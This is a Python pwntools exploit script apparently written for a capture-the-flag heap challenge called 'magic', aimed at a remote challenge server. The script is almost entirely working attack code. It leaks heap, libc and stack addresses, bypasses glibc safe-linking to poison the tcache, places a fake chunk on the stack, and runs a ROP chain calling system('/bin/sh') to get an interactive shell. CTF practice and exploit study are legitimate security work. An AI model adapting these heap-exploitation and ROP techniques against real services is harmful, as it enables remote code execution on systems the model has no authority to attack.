#!/usr/bin/env python3

import re
from pwn import *


exe = ELF("./magic_patched")
libc = ELF("./libc.so.6", checksec = False)
ld = ELF("./ld-2.37.so", checksec = False)

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, "break update_magic_numbers")
    else:
        r = remote("94.237.120.233", 41472)

    return r


def set_magic_number(idx: int, number: bytes):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"magic number: ", str(idx).encode())
    r.sendlineafter(b"Magic number: ", str(number).encode())


def create_spell(data: bytes):
    r.sendlineafter(b"> ", b"2")
    r.sendafter(b"Spell: ", data)


def remove_spell(idx: int):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"Index: ", str(idx).encode())


def read_super_spell() -> bytes:
    r.sendlineafter(b"> ", b"4")
    r.recvlines(10)     # read garbage
    output = r.recvuntil(b".=::::::.::::.::::.::.::::.::.::.::.::.::::.:::.::::.::.-:", drop = True)
    matches = re.findall(b':-:(.+?):-:', output, re.S)  # "re.S" allows the '.' to match newline characters if needed
    return b"".join(m.strip(b" \n\r") for m in matches)


def set_super_spell(idx: int, update: bool = True):
    r.sendlineafter(b"> ", b"5")
    if not update:
        r.sendlineafter(b"Favorite spell: ", str(idx).encode())


def main():
    r = conn()

    libc.sym["pop_rdi"] = 0x27c65

    # Set power level to 4
    r.sendlineafter(b"> ", b"Alohomora")

    # Prepare two chunks: one to free and the other to use to leak stuff
    create_spell(b"A" * 0x28)
    create_spell(b"B" * 0xb0)
    remove_spell(0)

    # Leak heap
    set_magic_number(1, 0)      # this will call `memset(magic_numbers[power + 1], 0, 1)`
    set_super_spell(1, update=False)
    heap = u64(read_super_spell()[160:168]) << 12
    log.info(f"heap: 0x{heap:x}")

    # Prepare 7 chunks to fill the tcache and 2 more for an unsorted bin chunk.
    # Keep in mind that we need one chunk for the leak and another to avoid consolidation!
    # Also we are going to prepare small fake chunks inside them for later
    fake_chunk = p64(0x31) + p64(0x0) * 5

    for _ in range(9):
        create_spell(b"\x00" * 0x18 + fake_chunk * 6)

    for idx in range(2, 10):
        remove_spell(idx)

    # Leak libc
    set_magic_number(2, 0x0000FFFFFFFFFFFF)
    set_magic_number(4, heap + 0xc50)   # this will replace the second spell with 0xff..ff & target => target
    set_super_spell(1)  # this will refresh the saved super_spell to the new (overwritten) one
    libc.address = u64(read_super_spell()[:8]) - 0x1d3ce0
    log.info(f"libc: 0x{libc.address:x}")

    # Leak stack
    set_magic_number(4, libc.sym.environ)   # same as before
    set_super_spell(1)
    ret_addr = u64(read_super_spell()[:8]) - 0x190
    log.info(f"target ret_addr: 0x{ret_addr:x}")

    # We need to free two chunks and then allocate the bigger one in which they reside so we
    # will be able to overwrite the next_ptr of one of them. In this way we will be able to
    # allocate a chunk at any arbitrary address. For simplicity we free more than two chunks
    for offset in range(0xc20, 0xb00, -0x30):
        set_magic_number(4, heap + offset)
        remove_spell(1)

    # We are going to allocate a 0x140-sized chunk to overwrite the first chunk in the
    # tcache and change its next_ptr to our target stack address. We need to allocate it
    # 8 bytes before the target to meet the alignment requirements for the chunks
    fake_chunk = flat(0x0, 0x0, 0x0, 0x31, (ret_addr - 0x8) ^ (heap >> 12)).ljust(0x138, b"\x00")
    create_spell(fake_chunk)

    # Create the payload for the "stack" chunk and perform a ret2system
    payload = flat(
        b"B" * 0x8,
        libc.sym["pop_rdi"],
        libc.search(b"/bin/sh\x00").__next__(),
        libc.sym["pop_rdi"] + 1,    # "ret;" gadget to align the stack to 0x10 for `system()`
        libc.sym.system
    )

    create_spell(b"A" * 0x28)
    create_spell(payload)

    # Enjoy the shell!
    r.interactive("$ ")


if __name__ == "__main__":
    main()
